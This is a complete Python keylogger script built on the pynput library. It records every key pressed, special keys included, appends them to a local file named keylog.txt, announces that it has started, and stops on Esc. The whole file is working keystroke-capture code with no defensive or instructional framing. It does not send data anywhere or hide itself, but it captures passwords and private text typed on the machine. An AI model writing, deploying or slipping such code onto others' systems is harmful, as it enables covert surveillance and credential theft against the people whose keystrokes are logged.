from pynput import keyboard

# File to save the logged keystrokes
LOG_FILE = "keylog.txt"

# Set to keep track of currently pressed keys
pressed_keys = set()

def on_press(key):
    try:
        # Check if the key is already in the set (i.e., it's being held down)
        if key not in pressed_keys:
            # Add the key to the set
            pressed_keys.add(key)
            # Log the key pressed
            with open(LOG_FILE, "a") as f:
                try:
                    # Log regular keys
                    f.write(key.char)
                except AttributeError:
                    # Log special keys (e.g., shift, ctrl, etc.)
                    special_key = str(key).replace("Key.", "")
                    f.write(f"[{special_key}]")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_release(key):
    # Remove the key from the set when it is released
    if key in pressed_keys:
        pressed_keys.remove(key)
    # Stop the keylogger if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
def start_keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
